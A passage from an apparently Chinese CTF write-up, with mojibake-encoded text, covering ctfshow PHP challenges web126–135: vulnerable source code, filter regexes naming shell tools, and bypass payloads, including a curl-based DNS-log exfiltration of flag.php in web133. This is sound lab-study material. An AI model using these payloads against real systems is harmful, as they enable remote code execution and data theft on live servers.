$_SERVER[â€˜QUERY_STRINGâ€™]</code></li><li><code>$_SERVER[&quot;QUERY_STRING&quot;]</code>ï¼šè·å–çš„æ˜¯?åé¢çš„å€¼</li><li>assert()ï¼š æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸ºFALSE</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br><span class="line">    </span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>() ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æœä¸º <span class="literal">FALSE</span> æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ã€‚</span><br></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥æˆ‘ä»¬getä¼ å…¥çš„æ•°æ®ä¼šä¿å­˜åˆ°ä¸€ä¸ªç´¢å¼•ä¸º0çš„æ•°ç»„ä¸­ï¼Œä¸”ä¼šè¢«å½“ä½œphpè„šæœ¬æ‰§è¡Œ<br>POSTå‚æ•°ä¸­ï¼šå› ä¸ºè¿‡æ»¤äº†echoï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ–­è¨€å‡½æ•°assertæ¥æ‰§è¡Œä¸Šè¿°æ•°ç»„ï¼Œä»è€Œè®©<code>$fl0g=flag_give_me</code></p></blockquote><h1 id="web126-SERVER-â€˜argvâ€™"><a href="#web126-SERVER-â€˜argvâ€™" class="headerlink" title="web126($_SERVER[â€˜argvâ€™])"></a>web126($_SERVER[â€˜argvâ€™])</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li>è¿‡æ»¤äº†flagè¿˜æœ‰ä¸€å †å­—æ¯ï¼Œä½†æ˜¯æ˜¯é’ˆå¯¹POSTå‚æ•°ï¼ŒGETå‚æ•°ä¸å½±å“ï¼Œæ‰€ä»¥payloadè·Ÿä¸Šé“é¢˜ä¸€æ ·</li></ul><h1 id="web127-SERVER-â€˜QUERY-STRINGâ€™"><a href="#web127-SERVER-â€˜QUERY-STRINGâ€™" class="headerlink" title="web127($_SERVER[â€˜QUERY_STRINGâ€™])"></a>web127($_SERVER[â€˜QUERY_STRINGâ€™])</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?ctf[show=ilove36d</code></p><ul><li>æºç å°†<code>$ctf_show</code>èµ‹å€¼ä¸ºç»è¿‡md5åŠ å¯†åçš„flag</li><li>æƒ³è¦è¾“å‡ºflagï¼Œåªèƒ½å°†<code>$ctf_show</code>é‡æ–°èµ‹å€¼</li><li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>å°†<code>?</code>åé¢çš„æ•°æ®ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¿å­˜ä¸‹æ¥</li><li>åˆå› ä¸ºæœ‰ä¸ªç‰¹æ®Šç¬¦å·æ£€æµ‹ï¼Œè¿‡æ»¤äº†ä¸€å¤§å †å­—ç¬¦</li><li>æ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>[</code>ä»£æ›¿<code>_</code>é‡æ–°å°†<code>$ctf_show</code>èµ‹å€¼</li></ul><h1 id="web128-gettext-ï¼Œget-defined-vars"><a href="#web128-gettext-ï¼Œget-defined-vars" class="headerlink" title="web128(gettext()ï¼Œget_defined_vars)"></a>web128(gettext()ï¼Œget_defined_vars)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?f1=_&amp;f2=get_defined_vars</code></p><ul><li>å¯¹<code>f1</code>å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</li><li><code>_()==gettext()</code>ï¼šç¿»è¯‘å†…å®¹</li><li><code>get_defined_vars</code>ï¼š<ul><li>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</li><li>å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡</li></ul></li></ul><blockquote><p>å› ä¸ºè°ƒç”¨äº†ä¸¤æ¬¡å›è°ƒå‡½æ•°<br>æ‰€ä»¥å¤–å±‚å›è°ƒè°ƒç”¨çš„åº”è¯¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å†…å±‚å›è°ƒçš„ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ªå‡½æ•°åå­—<br>è¦æƒ³å¾—åˆ°å‡½æ•°åå­—ï¼Œéœ€è¦è°ƒç”¨<code>gettext()</code>å‡½æ•°ï¼Œæ¥å°†<code>get_defined_vars</code>è¾“å‡º</p></blockquote><h1 id="web129-striposï¼Œreadfile"><a href="#web129-striposï¼Œreadfile" class="headerlink" title="web129(striposï¼Œreadfile)"></a>web129(striposï¼Œreadfile)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?f=./ctfshow/../flag.php</code></p><ul><li><code>stripos($haystack , $needle)</code> æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰<ul><li><code>$haystack</code>ï¼šåœ¨è¯¥å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾</li><li><code>$needle</code>ï¼šç›®æ ‡å­—ç¬¦ä¸²</li></ul></li><li><code>readfile()</code>è¾“å‡ºæ–‡ä»¶</li></ul><blockquote><p>ä¼ å…¥å‚æ•°éœ€å­˜åœ¨ctfshowå­—ç¬¦ä¸²ï¼Œä¸”ä¸åœ¨ç¬¬ä¸€ä¸ªä½ç½®<br>è®¿é—®ctfshow.phpå‘ç°æ²¡æœ‰æ•°æ®<br>æ‰€ä»¥çŒœæµ‹ctfshowå¯èƒ½æ˜¯ä¸ªç›®å½•<br>ç»§ç»­å¯»æ‰¾å½“å‰ç›®å½•æ²¡æœ‰æ•°æ®ï¼Œæµ‹è¯•ä¸Šå±‚ç›®å½•å‘ç°flag</p><p>æˆ–è€…å¯ä»¥ä½¿ç”¨phpä¼ªåè®®è¯»å–ç›®å½•ï¼Œä¼ªåè®®ä¸­éœ€è¦åŠ ä¸Šctfshow</p></blockquote><h1 id="web130-stripos"><a href="#web130-stripos" class="headerlink" title="web130(stripos)"></a>web130(stripos)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f=ctfshow</code></p><ul><li>æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€éšä¾¿ä¼ äº†ä¸ªå‚æ•°ï¼Œæ²¡æƒ³åˆ°flagå°±å‡ºæ¥äº†<code>0.o</code></li><li>ç¬¬äºŒä¸ªifåˆ¤æ–­è®©æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°éœ€å«æœ‰ctfshow</li><li>æ­£åˆ™åŒ¹é…ä¼šåŒ¹é…ctfshowå‰é¢çš„å­—ç¬¦ï¼Œè¦æƒ³ç»•è¿‡æ­¤ifåˆ¤æ–­ï¼Œctfshowå‰ä¸èƒ½æœ‰å­—ç¬¦</li></ul><h1 id="web131-æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡"><a href="#web131-æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡" class="headerlink" title="web131(æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡)"></a>web131(æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f=ctfshow*100000036Dctfshow</code></p><ul><li><code>+?</code>çœ‹åˆ°è¿™ä¸ªä¸€èˆ¬éƒ½æ˜¯æœ€å¤§å›æº¯æ¬¡æ•°</li><li>ä¼ 1000000ä¸ªctfshowç»•è¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­</li><li>æœ€åä¼ ä¸ª36Dctfshowå¾—åˆ°flag</li></ul><h1 id="web132-æ•æ„Ÿæ–‡ä»¶"><a href="#web132-æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="web132(æ•æ„Ÿæ–‡ä»¶)"></a>web132(æ•æ„Ÿæ–‡ä»¶)</h1><ul><li>æ˜¯ä¸ªæ­£å¸¸çš„ç½‘ç«™ï¼Œåˆ©ç”¨æ•æ„Ÿæ–‡ä»¶<code>/robots.txt</code></li><li>æˆ–è€…æ‹¿å¾¡å‰‘æ‰«ç›®å½•</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?username=admin&amp;password[]=1&amp;code=admin</code></p><ul><li><p><code>mt_rand</code>ï¼šç”Ÿæˆæ›´å¥½çš„éšæœºæ•°</p></li><li><p>æŒ‰ç…§è¦æ±‚æ¥æ„é€ å‚æ•°</p><ul><li>username=admin</li><li>code=admin</li><li>passwordç”¨æ•°ç»„ç»•è¿‡</li></ul></li></ul><h1 id="web133-æ— å›æ˜¾rceï¼Œdnslogå¤–å¸¦"><a href="#web133-æ— å›æ˜¾rceï¼Œdnslogå¤–å¸¦" class="headerlink" title="web133(æ— å›æ˜¾rceï¼Œdnslogå¤–å¸¦)"></a>web133(æ— å›æ˜¾rceï¼Œdnslogå¤–å¸¦)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?F=`$F `;curl `cat flag.php`.k4t3vw.dnslog.cn</code></p><ul><li><code>substr($F,0,6)</code>ï¼šä»0ä½ç½®å¼€å§‹æˆªå–6ä¸ªé•¿åº¦ã€‚</li><li>`<code>å’Œ</code>shell_exec`ç­‰ä»·</li><li>è§£é¢˜æ€è·¯ï¼š</li></ul><blockquote><p>å› ä¸ºå‚æ•°åªèƒ½ä¸ºå…­ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å‘½ä»¤æ‰§è¡Œå‡½æ•°åªæœ‰``äº†</p><p>åˆå› ä¸ºéœ€è¦ä¼ å‘½ä»¤ï¼Œä½†æ˜¯å…­ä¸ªå­—ç¬¦è‚¯å®šä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥è€ƒè™‘å˜é‡è¦†ç›–ï¼Œç”¨$Fæ›¿æ¢Fï¼Œä»è€Œè¾¾åˆ°è¶…å‡ºå…­ä¸ªå­—ç¬¦æ‰§è¡Œå‘½ä»¤çš„ç»“æœ</p><p>å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥åªèƒ½å°†ç»“æœç”¨åˆ«çš„æ–¹æ³•è¾“å‡ºå‡ºæ¥ï¼Œè¿™é‡Œç”¨çš„æ˜¯Dnslogå¤–å¸¦æ•°æ®</p><p>å°†Fè¦†ç›–åï¼Œåˆ©ç”¨curlå°†å‘½ä»¤ä¸dnslogçš„äºŒçº§åŸŸåä¸€èµ·å¸¦å‡ºæ¥ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­ï¼Œä¼šå°†``é‡Œé¢çš„æ•°æ®å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°å°†æ•°æ®å¸¦å‡ºã€‚</p></blockquote><h1 id="web134-parse-str-amp-extract"><a href="#web134-parse-str-amp-extract" class="headerlink" title="web134(parse_str&amp;extract)"></a>web134(parse_str&amp;extract)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><ul><li><code>parse_str()</code>ï¼šæŠŠæŸ¥è¯¢å­—ç¬¦è§£æåˆ°å˜é‡</li><li><code>ectract()</code>ï¼šä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥å½“å‰çš„ç¬¦å·è¡¨</li><li>phpå˜é‡è¦†ç›– åˆ©ç”¨ç‚¹æ˜¯ extract($_POST); è¿›è¡Œè§£æ$_POSTæ•°ç»„ã€‚ å…ˆå°†GETæ–¹æ³•è¯·æ±‚çš„è§£ææˆå˜é‡ï¼Œç„¶ååœ¨åˆ©ç”¨extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</li></ul><h1 id="web135-linuxå‘½ä»¤"><a href="#web135-linuxå‘½ä»¤" class="headerlink" title="web135(linuxå‘½ä»¤)"></a>web135(linuxå‘½ä»¤)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span 